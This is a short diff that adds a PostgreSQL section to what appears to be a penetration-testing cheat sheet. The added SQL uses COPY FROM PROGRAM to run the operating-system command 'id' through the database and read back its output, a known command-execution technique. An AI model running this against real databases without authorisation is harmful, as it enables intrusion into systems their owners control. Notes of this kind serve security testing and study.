@@ -845,6 +845,16 @@ Do you know if there is any way to get them back?
 -James
 ```
 
+# PostgreSQL
+## Unix socket forwarding
+[Unix Socket Forwarding](#unix-socket-forwarding)
+## Run command
+```
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'id';
+SELECT * FROM cmd_exec;
+```
+
 
 # Linux command
 
